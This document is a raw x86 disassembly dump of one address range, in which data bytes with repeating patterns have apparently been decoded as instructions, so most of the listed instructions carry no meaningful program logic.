  449516:	inc    DWORD PTR [eax]
  449518:	add    BYTE PTR [edx-0x1],al
  44951b:	add    BYTE PTR [eax],al
  44951d:	cmp    edi,edi
  44951f:	add    BYTE PTR [eax],al
  449521:	dec    esp
  449522:	inc    DWORD PTR [eax]
  449524:	add    BYTE PTR [esi],bh
  449526:	inc    DWORD PTR [eax]
  449528:	add    BYTE PTR [ecx-0x1],al
  44952b:	add    BYTE PTR [eax],al
  44952d:	aas    
  44952e:	inc    DWORD PTR [eax]
  449530:	add    BYTE PTR [edi],bh
  449532:	inc    DWORD PTR [eax]
  449534:	add    BYTE PTR [ecx],bh
  449536:	inc    DWORD PTR [eax]
  449538:	add    BYTE PTR [edi],dh
  44953a:	inc    DWORD PTR [eax]
  44953c:	add    BYTE PTR [esi],dh
  44953e:	inc    DWORD PTR [eax]
  449540:	add    BYTE PTR [ecx],bh
  449542:	inc    DWORD PTR [eax]
  449544:	add    BYTE PTR [ebx],dh
  449546:	inc    DWORD PTR [eax]
  449548:	add    BYTE PTR ds:0x330000ff,dh
  44954e:	inc    DWORD PTR [eax]
  449550:	add    BYTE PTR ds:0x340000ff,dh
  449556:	inc    DWORD PTR [eax]
  449558:	add    BYTE PTR [edi],ch
  44955a:	inc    DWORD PTR [eax]
  44955c:	add    BYTE PTR [edx],ch
  44955e:	inc    DWORD PTR [eax]
  449560:	add    BYTE PTR [ecx],ch
  449562:	inc    DWORD PTR [eax]
  449564:	add    BYTE PTR [edi],ch
  449566:	inc    DWORD PTR [eax]
  449568:	add    BYTE PTR [esi],ch
  44956a:	inc    DWORD PTR [eax]
  44956c:	add    BYTE PTR [edx],ah
  44956e:	inc    DWORD PTR [eax]
  449570:	add    BYTE PTR [esi],bl
  449572:	inc    DWORD PTR [eax]
  449574:	add    BYTE PTR [ecx],ah
  449576:	inc    DWORD PTR [eax]
  449578:	add    BYTE PTR [esi],ah
  44957a:	inc    DWORD PTR [eax]
  44957c:	add    BYTE PTR [eax],ch
  44957e:	inc    DWORD PTR [eax]
  449580:	add    BYTE PTR [esi],ah
  449582:	inc    DWORD PTR [eax]
  449584:	add    BYTE PTR [edi+edi*8],ah
  449587:	add    BYTE PTR [eax],al
  449589:	daa    
  44958a:	inc    DWORD PTR [eax]
  44958c:	add    BYTE PTR [ebx],ah
  44958e:	inc    DWORD PTR [eax]
  449590:	add    BYTE PTR [ecx],ch
  449592:	inc    DWORD PTR [eax]
  449594:	add    BYTE PTR [eax],bh
  449596:	inc    DWORD PTR [eax]
  449598:	add    BYTE PTR [edi+edi*8],dh
  44959b:	add    BYTE PTR [eax],al
  44959d:	sub    eax,0x330000ff
  4495a2:	inc    DWORD PTR [eax]
  4495a4:	add    BYTE PTR [esi],dh
  4495a6:	inc    DWORD PTR [eax]
  4495a8:	add    BYTE PTR [esi],dh
  4495aa:	inc    DWORD PTR [eax]
  4495ac:	add    BYTE PTR [ecx],dh
  4495ae:	inc    DWORD PTR [eax]
  4495b0:	add    BYTE PTR [edx],dh
  4495b2:	inc    DWORD PTR [eax]
  4495b4:	add    BYTE PTR ds:0x340000ff,dh
  4495ba:	inc    DWORD PTR [eax]
  4495bc:	add    BYTE PTR ds:0x3c0000ff,bh
  4495c2:	inc    DWORD PTR [eax]
  4495c4:	add    BYTE PTR [eax-0x1],al
  4495c7:	add    BYTE PTR [eax],al
  4495c9:	cmp    bh,bh
  4495cb:	add    BYTE PTR [eax],al
  4495cd:	xor    al,0xff
  4495cf:	add    BYTE PTR [eax],al
  4495d1:	cmp    bh,bh
  4495d3:	add    BYTE PTR [eax],al
  4495d5:	dec    edx
  4495d6:	inc    DWORD PTR [eax]
  4495d8:	add    BYTE PTR [ebx-0x1],al
  4495db:	add    BYTE PTR [eax],al
  4495dd:	inc    esp
  4495de:	inc    DWORD PTR [eax]
  4495e0:	add    BYTE PTR [esi-0x1],al
  4495e3:	add    BYTE PTR [eax],al
  4495e5:	inc    edx
  4495e6:	inc    DWORD PTR [eax]
  4495e8:	add    BYTE PTR [edx-0x1],al
  4495eb:	add    BYTE PTR [eax],al
  4495ed:	aas    
  4495ee:	inc    DWORD PTR [eax]
  4495f0:	add    BYTE PTR [edi+edi*8],bh
  4495f3:	add    BYTE PTR [eax],al
  4495f5:	dec    ecx
  4495f6:	inc    DWORD PTR [eax]
  4495f8:	add    BYTE PTR [edi+edi*8+0x0],al
  4495fc:	add    BYTE PTR [ebx-0x1],al
  4495ff:	add    BYTE PTR [eax],al
  449601:	dec    esp
  449602:	inc    DWORD PTR [eax]
  449604:	add    BYTE PTR [ecx-0x1],cl
  449607:	add    BYTE PTR [eax],al
  449609:	inc    esi
  44960a:	inc    DWORD PTR [eax]
  44960c:	add    BYTE PTR [edx-0x1],cl
  44960f:	add    BYTE PTR [eax],al
  449611:	inc    ebx
  449612:	inc    DWORD PTR [eax]
  449614:	add    BYTE PTR [edx-0x1],al
  449617:	add    BYTE PTR [eax],al
  449619:	cmp    eax,0x3d0000ff
  44961e:	inc    DWORD PTR [eax]
  449620:	add    BYTE PTR [ecx-0x1],al
  449623:	add    BYTE PTR [eax],al
  449625:	cmp    edi,edi
  449627:	add    BYTE PTR [eax],al
  449629:	inc    DWORD PTR ds:[eax]
  44962c:	add    BYTE PTR ds:0x3a0000ff,bh
  449632:	inc    DWORD PTR [eax]
  449634:	add    BYTE PTR [edi],dh
  449636:	inc    DWORD PTR [eax]
  449638:	add    BYTE PTR ds:0x350000ff,dh
  44963e:	inc    DWORD PTR [eax]
  449640:	add    BYTE PTR [ecx],bh
  449642:	inc    DWORD PTR [eax]
  449644:	add    BYTE PTR [esi],dh
  449646:	inc    DWORD PTR [eax]
  449648:	add    BYTE PTR [eax],dh
  44964a:	inc    DWORD PTR [eax]
  44964c:	add    BYTE PTR [ecx],dh
  44964e:	inc    DWORD PTR [eax]
  449650:	add    BYTE PTR [edi+edi*8],dh
  449653:	add    BYTE PTR [eax],al
  449655:	xor    bh,bh
  449657:	add    BYTE PTR [eax],al
  449659:	xor    bh,bh
  44965b:	add    BYTE PTR [eax],al
  44965d:	sub    bh,bh
  44965f:	add    BYTE PTR [eax],al
  449661:	das    
  449662:	inc    DWORD PTR [eax]
  449664:	add    BYTE PTR [esi],ch
  449666:	inc    DWORD PTR [eax]
  449668:	add    BYTE PTR [edx],ch
  44966a:	inc    DWORD PTR [eax]
  44966c:	add    BYTE PTR [ecx],ah
  44966e:	inc    DWORD PTR [eax]
  449670:	add    BYTE PTR [edi],bl
  449672:	inc    DWORD PTR [eax]
  449674:	add    BYTE PTR [ecx],ah
  449676:	inc    DWORD PTR [eax]
  449678:	add    BYTE PTR [esi],bl
  44967a:	inc    DWORD PTR [eax]
  44967c:	add    BYTE PTR [ecx],ah
  44967e:	inc    DWORD PTR [eax]
  449680:	add    BYTE PTR [edx],ah
  449682:	inc    DWORD PTR [eax]
  449684:	add    BYTE PTR [ecx],ch
  449686:	inc    DWORD PTR [eax]
  449688:	add    BYTE PTR [eax],ch
  44968a:	inc    DWORD PTR [eax]
  44968c:	add    BYTE PTR [ebx],ah
  44968e:	inc    DWORD PTR [eax]
  449690:	add    BYTE PTR ds:0x2a0000ff,ah
  449696:	inc    DWORD PTR [eax]
  449698:	add    BYTE PTR [edx],ch
  44969a:	inc    DWORD PTR [eax]
  44969c:	add    BYTE PTR [ebx],ch
  44969e:	inc    DWORD PTR [eax]
  4496a0:	add    BYTE PTR ds:0x390000ff,dh
  4496a6:	inc    DWORD PTR [eax]
  4496a8:	add    BYTE PTR ds:0x350000ff,dh
  4496ae:	inc    DWORD PTR [eax]
  4496b0:	add    BYTE PTR [edi+edi*8],dh
  4496b3:	add    BYTE PTR [eax],al
  4496b5:	cmp    bh,bh
  4496b7:	add    BYTE PTR [eax],al
  4496b9:	inc    DWORD PTR ss:[eax]
  4496bc:	add    BYTE PTR [edi+edi*8],bh
  4496bf:	add    BYTE PTR [eax],al
  4496c1:	cmp    al,0xff
  4496c3:	add    BYTE PTR [eax],al
  4496c5:	cmp    al,0xff
  4496c7:	add    BYTE PTR [eax],al
  4496c9:	cmp    al,0xff
  4496cb:	add    BYTE PTR [eax],al
  4496cd:	cmp    al,0xff
  4496cf:	add    BYTE PTR [eax],al
  4496d1:	inc    edx
  4496d2:	inc    DWORD PTR [eax]
  4496d4:	add    BYTE PTR [edx-0x1],al
  4496d7:	add    BYTE PTR [eax],al
  4496d9:	inc    edx
  4496da:	inc    DWORD PTR [eax]
  4496dc:	add    BYTE PTR ds:0x3e0000ff,bh
  4496e2:	inc    DWORD PTR [eax]
  4496e4:	add    BYTE PTR [edx],bh
  4496e6:	inc    DWORD PTR [eax]
  4496e8:	add    BYTE PTR [esi-0x1],al
  4496eb:	add    BYTE PTR [eax],al
  4496ed:	inc    ecx
  4496ee:	inc    DWORD PTR [eax]
  4496f0:	add    BYTE PTR ds:0x400000ff,bh
  4496f6:	inc    DWORD PTR [eax]
  4496f8:	add    BYTE PTR [ebx-0x1],al
  4496fb:	add    BYTE PTR [eax],al
  4496fd:	aas    
  4496fe:	inc    DWORD PTR [eax]
  449700:	add    BYTE PTR [edi+edi*8+0x0],al
  449704:	add    BYTE PTR [edi],bh
  449706:	inc    DWORD PTR [eax]
  449708:	add    BYTE PTR [edi+edi*8],bh
  44970b:	add    BYTE PTR [eax],al
  44970d:	inc    ecx
  44970e:	inc    DWORD PTR [eax]
  449710:	add    BYTE PTR [ebp-0x1],al
  449713:	add    BYTE PTR [eax],al
  449715:	dec    edx
  449716:	inc    DWORD PTR [eax]
  449718:	add    BYTE PTR [ecx-0x1],al
  44971b:	add    BYTE PTR [eax],al
  44971d:	inc    eax
  44971e:	inc    DWORD PTR [eax]
  449720:	add    BYTE PTR [ebx],bh
  449722:	inc    DWORD PTR [eax]
  449724:	add    BYTE PTR [eax],bh
  449726:	inc    DWORD PTR [eax]
  449728:	add    BYTE PTR [edi+edi*8],bh
  44972b:	add    BYTE PTR [eax],al
  44972d:	cmp    bh,bh
  44972f:	add    BYTE PTR [eax],al
  449731:	cmp    bh,bh
  449733:	add    BYTE PTR [eax],al
  449735:	cmp    edi,edi
  449737:	add    BYTE PTR [eax],al
  449739:	cmp    edi,edi
  44973b:	add    BYTE PTR [eax],al
  44973d:	xor    edi,edi
  44973f:	add    BYTE PTR [eax],al
  449741:	aaa    
  449742:	inc    DWORD PTR [eax]
  449744:	add    BYTE PTR [ebx],dh
  449746:	inc    DWORD PTR [eax]
  449748:	add    BYTE PTR [ecx],dh
  44974a:	inc    DWORD PTR [eax]
  44974c:	add    BYTE PTR [esi],ch
  44974e:	inc    DWORD PTR [eax]
  449750:	add    BYTE PTR [edi+edi*8],ch
  449753:	add    BYTE PTR [eax],al
  449755:	sub    bh,bh
  449757:	add    BYTE PTR [eax],al
  449759:	inc    DWORD PTR cs:[eax]
  44975c:	add    BYTE PTR [edx],ch
  44975e:	inc    DWORD PTR [eax]
  449760:	add    BYTE PTR [ecx],ch
  449762:	inc    DWORD PTR [eax]
  449764:	add    BYTE PTR [eax],ch
  449766:	inc    DWORD PTR [eax]
  449768:	add    BYTE PTR ds:0x1d0000ff,ah
  44976e:	inc    DWORD PTR [eax]
  449770:	add    BYTE PTR [esi],bl
  449772:	inc    DWORD PTR [eax]
  449774:	add    BYTE PTR [edi+edi*8],ah
  449777:	add    BYTE PTR [eax],al
  449779:	sub    bh,bh
  44977b:	add    BYTE PTR [eax],al
  44977d:	and    al,0xff
  44977f:	add    BYTE PTR [eax],al
  449781:	and    edi,edi
  449783:	add    BYTE PTR [eax],al
  449785:	sub    edi,edi
  449787:	add    BYTE PTR [eax],al
  449789:	sub    edi,edi
  44978b:	add    BYTE PTR [eax],al
  44978d:	sub    bh,bh
  44978f:	add    BYTE PTR [eax],al
  449791:	sub    edi,edi
  449793:	add    BYTE PTR [eax],al
  449795:	sub    al,0xff
  449797:	add    BYTE PTR [eax],al
  449799:	sub    al,0xff
  44979b:	add    BYTE PTR [eax],al
  44979d:	sub    edi,edi
  44979f:	add    BYTE PTR [eax],al
  4497a1:	xor    bh,bh
  4497a3:	add    BYTE PTR [eax],al
  4497a5:	xor    edi,edi
  4497a7:	add    BYTE PTR [eax],al
  4497a9:	xor    edi,edi
  4497ab:	add    BYTE PTR [eax],al
  4497ad:	xor    bh,bh
  4497af:	add    BYTE PTR [eax],al
  4497b1:	xor    edi,edi
  4497b3:	add    BYTE PTR [eax],al
  4497b5:	xor    edi,edi
  4497b7:	add    BYTE PTR [eax],al
  4497b9:	cmp    bh,bh
  4497bb:	add    BYTE PTR [eax],al
  4497bd:	inc    ecx
  4497be:	inc    DWORD PTR [eax]
  4497c0:	add    BYTE PTR [edi+edi*8],bh
  4497c3:	add    BYTE PTR [eax],al
  4497c5:	inc    edx
  4497c6:	inc    DWORD PTR [eax]
  4497c8:	add    BYTE PTR [esi],bh
  4497ca:	inc    DWORD PTR [eax]
  4497cc:	add    BYTE PTR [ebx],bh
  4497ce:	inc    DWORD PTR [eax]
  4497d0:	add    BYTE PTR [ecx],bh
  4497d2:	inc    DWORD PTR [eax]
  4497d4:	add    BYTE PTR [ebx],bh
  4497d6:	inc    DWORD PTR [eax]
  4497d8:	add    BYTE PTR [ebx-0x1],al
  4497db:	add    BYTE PTR [eax],al
  4497dd:	cmp    eax,0x3a0000ff
  4497e2:	inc    DWORD PTR [eax]
  4497e4:	add    BYTE PTR [edi+edi*8],dh
  4497e7:	add    BYTE PTR [eax],al
  4497e9:	inc    ebp
  4497ea:	inc    DWORD PTR [eax]
  4497ec:	add    BYTE PTR ds:0x380000ff,bh
  4497f2:	inc    DWORD PTR [eax]
  4497f4:	add    BYTE PTR ds:0x3f0000ff,bh
  4497fa:	inc    DWORD PTR [eax]
  4497fc:	add    BYTE PTR [edx],bh
  4497fe:	inc    DWORD PTR [eax]
  449800:	add    BYTE PTR [ecx-0x1],al
  449803:	add    BYTE PTR [eax],al
  449805:	inc    edi
  449806:	inc    DWORD PTR [eax]
  449808:	add    BYTE PTR [ebx],bh
  44980a:	inc    DWORD PTR [eax]
  44980c:	add    BYTE PTR [eax-0x1],al
  44980f:	add    BYTE PTR [eax],al
  449811:	inc    ecx
  449812:	inc    DWORD PTR [eax]
  449814:	add    BYTE PTR [ebx-0x1],al
  449817:	add    BYTE PTR [eax],al
  449819:	inc    esi
  44981a:	inc    DWORD PTR [eax]
  44981c:	add    BYTE PTR [edi-0x1],al
  44981f:	add    BYTE PTR [eax],al
  449821:	cmp    bh,bh
  449823:	add    BYTE PTR [eax],al
  449825:	cmp    edi,edi
  449827:	add    BYTE PTR [eax],al
  449829:	inc    eax
  44982a:	inc    DWORD PTR [eax]
  44982c:	add    BYTE PTR [edi],dh
  44982e:	inc    DWORD PTR [eax]
  449830:	add    BYTE PTR ds:0x360000ff,dh
  449836:	inc    DWORD PTR [eax]
  449838:	add    BYTE PTR ds:0x330000ff,dh
  44983e:	inc    DWORD PTR [eax]
  449840:	add    BYTE PTR [esi],dh
  449842:	inc    DWORD PTR [eax]
  449844:	add    BYTE PTR [edi],dh
  449846:	inc    DWORD PTR [eax]
  449848:	add    BYTE PTR [ecx],dh
  44984a:	inc    DWORD PTR [eax]
  44984c:	add    BYTE PTR [eax],dh
  44984e:	inc    DWORD PTR [eax]
  449850:	add    BYTE PTR [esi],ch
  449852:	inc    DWORD PTR [eax]
  449854:	add    BYTE PTR [edi+edi*8],ch
  449857:	add    BYTE PTR [eax],al
  449859:	sub    eax,0x2d0000ff
  44985e:	inc    DWORD PTR [eax]
  449860:	add    BYTE PTR [edx],ch
  449862:	inc    DWORD PTR [eax]
  449864:	add    BYTE PTR [ecx],ch
  449866:	inc    DWORD PTR [eax]
  449868:	add    BYTE PTR [edx],ah
  44986a:	inc    DWORD PTR [eax]
  44986c:	add    BYTE PTR [esi],bl
  44986e:	inc    DWORD PTR [eax]
  449870:	add    BYTE PTR [ebx],ah
  449872:	inc    DWORD PTR [eax]
  449874:	add    BYTE PTR [edx],ah
  449876:	inc    DWORD PTR [eax]
  449878:	add    BYTE PTR [esi],ah
  44987a:	inc    DWORD PTR [eax]
  44987c:	add    BYTE PTR ds:0x230000ff,ah
  449882:	inc    DWORD PTR [eax]
  449884:	add    BYTE PTR ds:0x260000ff,ah
  44988a:	inc    DWORD PTR [eax]
  44988c:	add    BYTE PTR ds:0x2d0000ff,ah
  449892:	inc    DWORD PTR [eax]
  449894:	add    BYTE PTR [esi],ch
  449896:	inc    DWORD PTR [eax]
  449898:	add    BYTE PTR [esi],ch
  44989a:	inc    DWORD PTR [edx]
  44989c:	add    al,BYTE PTR [edx]
  44989e:	inc    DWORD PTR [eax]
  4498a0:	add    BYTE PTR [eax],al
  4498a2:	inc    DWORD PTR [ebx]
  4498a4:	add    dl,BYTE PTR [edx]
  4498a6:	inc    DWORD PTR [eax]
  4498a8:	add    BYTE PTR [esi],dh
  4498aa:	inc    DWORD PTR [eax]
  4498ac:	add    BYTE PTR [edi],dh
  4498ae:	inc    DWORD PTR [eax]
  4498b0:	add    BYTE PTR [ebx],bh
  4498b2:	inc    DWORD PTR [eax]
  4498b4:	add    BYTE PTR [edi],dh
  4498b6:	inc    DWORD PTR [eax]
  4498b8:	add    BYTE PTR [edi+edi*8],dh
  4498bb:	add    BYTE PTR [eax],al
  4498bd:	cmp    eax,0x370000ff
  4498c2:	inc    DWORD PTR [eax]
  4498c4:	add    BYTE PTR [esi],bh
  4498c6:	inc    DWORD PTR [eax]
  4498c8:	add    BYTE PTR [esi],bh
  4498ca:	inc    DWORD PTR [eax]
  4498cc:	add    BYTE PTR [eax-0x1],al
  4498cf:	add    BYTE PTR [eax],al
  4498d1:	inc    ecx
  4498d2:	inc    DWORD PTR [eax]
  4498d4:	add    BYTE PTR [edi],bh
  4498d6:	inc    DWORD PTR [eax]
  4498d8:	add    BYTE PTR ds:0x410000ff,bh
  4498de:	inc    DWORD PTR [eax]
  4498e0:	add    BYTE PTR [ecx],bh
  4498e2:	inc    DWORD PTR [eax]
  4498e4:	add    BYTE PTR [ebx],dh
  4498e6:	inc    DWORD PTR [eax]
  4498e8:	add    BYTE PTR [eax],bh
  4498ea:	inc    DWORD PTR [eax]
  4498ec:	add    BYTE PTR [edi],dh
  4498ee:	inc    DWORD PTR [eax]
  4498f0:	add    BYTE PTR [edi],dh
  4498f2:	inc    DWORD PTR [eax]
  4498f4:	add    BYTE PTR [ebx-0x1],al
  4498f7:	add    BYTE PTR [eax],al
  4498f9:	inc    esp
  4498fa:	inc    DWORD PTR [eax]
  4498fc:	add    BYTE PTR ds:0x430000ff,bh
  449902:	inc    DWORD PTR [eax]
  449904:	add    BYTE PTR [edx-0x1],al
  449907:	add    BYTE PTR [eax],al
  449909:	inc    edx
  44990a:	inc    DWORD PTR [eax]
  44990c:	add    BYTE PTR [edx-0x1],al
  44990f:	add    BYTE PTR [eax],al
  449911:	inc    edx
  449912:	inc    DWORD PTR [eax]
  449914:	add    BYTE PTR [eax-0x1],al
  449917:	add    BYTE PTR [eax],al
  449919:	cmp    al,0xff
  44991b:	add    BYTE PTR [eax],al
  44991d:	cmp    al,0xff
  44991f:	add    BYTE PTR [eax],al
  449921:	inc    eax
  449922:	inc    DWORD PTR [eax]
  449924:	add    BYTE PTR [edx-0x1],al
  449927:	add    BYTE PTR [eax],al
  449929:	cmp    bh,bh
  44992b:	add    BYTE PTR [eax],al
  44992d:	cmp    al,0xff
  44992f:	add    BYTE PTR [eax],al
  449931:	cmp    bh,bh
  449933:	add    BYTE PTR [eax],al
  449935:	cmp    bh,bh
  449937:	add    BYTE PTR [eax],al
  449939:	inc    DWORD PTR ss:[eax]
  44993c:	add    BYTE PTR [eax],dh
  44993e:	inc    DWORD PTR [eax]
  449940:	add    BYTE PTR [ecx],dh
  449942:	inc    DWORD PTR [eax]
  449944:	add    BYTE PTR [edx],ch
  449946:	inc    DWORD PTR [eax]
  449948:	add    BYTE PTR ds:0x300000ff,ch
  44994e:	inc    DWORD PTR [eax]
  449950:	add    BYTE PTR [esi],ch
  449952:	inc    DWORD PTR [eax]
  449954:	add    BYTE PTR [edi+edi*8],ch
  449957:	add    BYTE PTR [eax],al
  449959:	inc    DWORD PTR cs:[eax]
  44995c:	add    BYTE PTR [ecx],ch
  44995e:	inc    DWORD PTR [eax]
  449960:	add    BYTE PTR [ecx],ch
  449962:	inc    DWORD PTR [eax]
  449964:	add    BYTE PTR [edi],ah
  449966:	inc    DWORD PTR [eax]
  449968:	add    BYTE PTR [eax],ch
  44996a:	inc    DWORD PTR [eax]
  44996c:	add    BYTE PTR [ebx],ah
  44996e:	inc    DWORD PTR [eax]
  449970:	add    BYTE PTR ds:0x220000ff,bl
  449976:	inc    DWORD PTR [eax]
  449978:	add    BYTE PTR ds:0x260000ff,ah
  44997e:	inc    DWORD PTR [eax]
  449980:	add    BYTE PTR [esi],ah
  449982:	inc    DWORD PTR [eax]
  449984:	add    BYTE PTR ds:0x2a0000ff,ah
  44998a:	inc    DWORD PTR [eax]
  44998c:	add    BYTE PTR [ecx],ah
  44998e:	inc    DWORD PTR [eax]
  449990:	add    BYTE PTR [edi],ah
  449992:	inc    DWORD PTR [eax]
  449994:	add    BYTE PTR [edi],ch
  449996:	inc    DWORD PTR [edx]
  449998:	add    dl,BYTE PTR ds:0x1ff
  44999e:	inc    DWORD PTR [eax]
  4499a0:	add    BYTE PTR [edi+edi*8],dl
  4499a3:	add    BYTE PTR [eax],al
  4499a5:	add    bh,bh
  4499a7:	add    al,BYTE PTR [ecx]
  4499a9:	pop    ss
  4499aa:	inc    DWORD PTR [eax]
  4499ac:	add    BYTE PTR [edi+edi*8],ch
  4499af:	add    BYTE PTR [eax],al
  4499b1:	xor    al,0xff
  4499b3:	add    BYTE PTR [eax],al
  4499b5:	aaa    
  4499b6:	inc    DWORD PTR [eax]
  4499b8:	add    BYTE PTR [ecx],bh
  4499ba:	inc    DWORD PTR [eax]
  4499bc:	add    BYTE PTR [edi],bh
  4499be:	inc    DWORD PTR [eax]
  4499c0:	add    BYTE PTR [edx],bh
  4499c2:	inc    DWORD PTR [eax]
  4499c4:	add    BYTE PTR [edi],dh
  4499c6:	inc    DWORD PTR [eax]
  4499c8:	add    BYTE PTR [esi],bh
  4499ca:	inc    DWORD PTR [eax]
  4499cc:	add    BYTE PTR [eax-0x1],al
  4499cf:	add    BYTE PTR [eax],al
  4499d1:	inc    ecx
  4499d2:	inc    DWORD PTR [eax]
  4499d4:	add    BYTE PTR [edx],bh
  4499d6:	inc    DWORD PTR [eax]
  4499d8:	add    BYTE PTR [esi],bh
  4499da:	inc    DWORD PTR [eax]
  4499dc:	add    BYTE PTR [esi-0x1],al
  4499df:	add    BYTE PTR [eax],al
  4499e1:	inc    eax
  4499e2:	inc    DWORD PTR [eax]
  4499e4:	add    BYTE PTR ds:0x370000ff,bh
  4499ea:	inc    DWORD PTR [eax]
  4499ec:	add    BYTE PTR ds:0x3d0000ff,bh
  4499f2:	inc    DWORD PTR [ebx]
  4499f4:	add    esi,DWORD PTR [edi+edi*8]
  4499f7:	add    DWORD PTR [ecx],eax
  4499f9:	add    bh,bh
  4499fb:	add    DWORD PTR [ecx],eax
  4499fd:	add    bh,bh
  4499ff:	add    DWORD PTR [ecx],eax
  449a01:	add    bh,bh
  449a03:	add    DWORD PTR [ecx],eax
  449a05:	add    bh,bh
  449a07:	add    DWORD PTR [ecx],eax
  449a09:	add    bh,bh
  449a0b:	add    DWORD PTR [ecx],eax
  449a0d:	add    bh,bh
  449a0f:	add    DWORD PTR [ecx],eax
  449a11:	add    bh,bh
  449a13:	add    DWORD PTR [ecx],eax
  449a15:	add    bh,bh
  449a17:	add    DWORD PTR [ecx],eax
  449a19:	add    bh,bh
  449a1b:	add    DWORD PTR [ecx],eax
  449a1d:	add    bh,bh
  449a1f:	add    DWORD PTR [ecx],eax
  449a21:	add    bh,bh
  449a23:	add    DWORD PTR [ecx],eax
  449a25:	add    bh,bh
  449a27:	add    DWORD PTR [ecx],eax
  449a29:	add    bh,bh
  449a2b:	add    DWORD PTR [ecx],eax
  449a2d:	add    bh,bh
  449a2f:	add    DWORD PTR [ecx],eax
  449a31:	add    bh,bh
  449a33:	add    DWORD PTR [ecx],eax
  449a35:	add    bh,bh
  449a37:	add    DWORD PTR [ecx],eax
  449a39:	add    bh,bh
  449a3b:	add    DWORD PTR [ecx],eax
  449a3d:	add    bh,bh
  449a3f:	push   es
  449a40:	add    eax,0xff04
  449a45:	sub    al,0xff
  449a47:	add    BYTE PTR [eax],al
  449a49:	sub    edi,edi
  449a4b:	add    BYTE PTR [eax],al
  449a4d:	sub    bh,bh
  449a4f:	add    BYTE PTR [eax],al
  449a51:	and    eax,0x2a0000ff
  449a56:	inc    DWORD PTR [eax]
  449a58:	add    BYTE PTR [eax],ch
  449a5a:	inc    DWORD PTR [eax]
  449a5c:	add    BYTE PTR [edi+edi*8],ch
  449a5f:	add    BYTE PTR [eax],al
  449a61:	and    edi,edi
  449a63:	add    BYTE PTR [eax],al
  449a65:	and    bh,bh
  449a67:	add    BYTE PTR [eax],al
  449a69:	and    al,0xff
  449a6b:	add    BYTE PTR [eax],al
  449a6d:	sbb    eax,0x1b0000ff
  449a72:	inc    DWORD PTR [eax]
  449a74:	add    BYTE PTR [esi],ah
  449a76:	inc    DWORD PTR [eax]
  449a78:	add    BYTE PTR [eax],ch
  449a7a:	inc    DWORD PTR [eax]
  449a7c:	add    BYTE PTR [esi],ah
  449a7e:	inc    DWORD PTR [eax]
  449a80:	add    BYTE PTR ds:0x1f0000ff,ah
  449a86:	inc    DWORD PTR [eax]
  449a88:	add    BYTE PTR [ebx],ah
  449a8a:	inc    DWORD PTR [eax]
  449a8c:	add    BYTE PTR [eax],ch
  449a8e:	inc    DWORD PTR [eax]
  449a90:	add    BYTE PTR ds:0x270000ff,ah
  449a96:	inc    DWORD PTR [ecx]
  449a98:	add    BYTE PTR [eax],al
  449a9a:	inc    DWORD PTR [eax]
  449a9c:	add    DWORD PTR [ecx],ebp
  449a9e:	call   DWORD PTR [edi+0x65]
  449aa1:	sar    edi,cl
  449aa3:	xor    DWORD PTR [esi],esi
  449aa5:	je     0x449aa6
  449aa7:	add    BYTE PTR [eax],al
  449aa9:	add    bh,bh
  449aab:	add    DWORD PTR [ecx],eax
  449aad:	add    bh,bh
  449aaf:	add    DWORD PTR [ecx],eax
  449ab1:	add    bh,bh
  449ab3:	add    DWORD PTR [ecx],eax
  449ab5:	add    bh,bh
  449ab7:	add    DWORD PTR [ecx],eax
  449ab9:	add    bh,bh
  449abb:	add    DWORD PTR [ecx],eax
  449abd:	add    bh,bh
  449abf:	add    DWORD PTR [ecx],eax
  449ac1:	add    bh,bh
  449ac3:	add    DWORD PTR [ecx],eax
  449ac5:	add    bh,bh
  449ac7:	add    DWORD PTR [ecx],eax
  449ac9:	add    bh,bh
  449acb:	add    DWORD PTR [ecx],eax
  449acd:	add    bh,bh
  449acf:	add    DWORD PTR [ecx],eax
  449ad1:	add    bh,bh
  449ad3:	add    DWORD PTR [ecx],eax
  449ad5:	add    bh,bh
  449ad7:	add    DWORD PTR [ecx],eax
  449ad9:	add    bh,bh
  449adb:	add    DWORD PTR [ecx],eax
  449add:	add    bh,bh
  449adf:	add    BYTE PTR [eax],al
  449ae1:	xor    bh,bh
  449ae3:	add    DWORD PTR [ecx],eax
  449ae5:	add    bh,bh
  449ae7:	add    DWORD PTR [ecx],eax
  449ae9:	add    bh,bh
  449aeb:	add    BYTE PTR [eax],al
  449aed:	aaa    
  449aee:	dec    DWORD PTR [eax]
  449af0:	pop    es
  449af1:	daa    
  449af2:	inc    DWORD PTR ds:0xaff0d05
  449af8:	or     eax,0x3c34ff47
  449afd:	jge    0x449afe
  449aff:	dec    esi
  449b00:	dec    edi
  449b01:	jge    0x449b02
  449b03:	dec    ebp
  449b04:	push   esp
  449b05:	jge    0x449b06
  449b07:	inc    esp
  449b08:	inc    edi
  449b09:	ins    DWORD PTR es:[edi],dx
  449b0a:	(bad)  
  449b0b:	cmp    eax,0x44ff7144
  449b10:	inc    esi
  449b11:	ins    BYTE PTR es:[edi],dx
  449b12:	(bad)  
  449b13:	cmp    BYTE PTR [edi+0x6b],al
  449b16:	jmp    DWORD PTR [ecx]
  449b18:	aas    
  449b19:	je     0x449b1a
  449b1b:	add    al,0x8
  449b1d:	cmp    edi,edi
  449b1f:	pop    es
  449b20:	pop    es
  449b21:	sbb    eax,0x6e402cff
  449b26:	jmp    FWORD PTR [eax]
  449b28:	cmp    ch,BYTE PTR [edx-0x1]
  449b2b:	cmp    al,0x53
  449b2d:	jne    0x449b2e
  449b2f:	cmp    edx,DWORD PTR [ebp+0x73]
  449b32:	call   FWORD PTR [eax+edi*1]
  449b35:	ins    BYTE PTR es:[edi],dx
  449b36:	call   FWORD PTR [esi]
  449b38:	cmp    al,0x6c
  449b3a:	inc    DWORD PTR [ecx]
  449b3c:	add    DWORD PTR [eax],eax
  449b3e:	inc    DWORD PTR [ecx]
  449b40:	add    DWORD PTR [eax],eax
  449b42:	inc    DWORD PTR [ecx]
  449b44:	add    DWORD PTR [eax],eax
  449b46:	inc    DWORD PTR [eax]
  449b48:	add    BYTE PTR [esi],ch
  449b4a:	inc    DWORD PTR [eax]
  449b4c:	add    BYTE PTR [eax],ch
  449b4e:	inc    DWORD PTR [eax]
  449b50:	add    BYTE PTR [edi+edi*8],ch
  449b53:	add    BYTE PTR [eax],al
  449b55:	sub    edi,edi
  449b57:	add    BYTE PTR [eax],al
  449b59:	sub    edi,edi
  449b5b:	add    BYTE PTR [eax],al
  449b5d:	sub    bh,bh
  449b5f:	add    BYTE PTR [eax],al
  449b61:	and    edi,edi
  449b63:	add    BYTE PTR [eax],al
  449b65:	and    edi,edi
  449b67:	add    BYTE PTR [eax],al
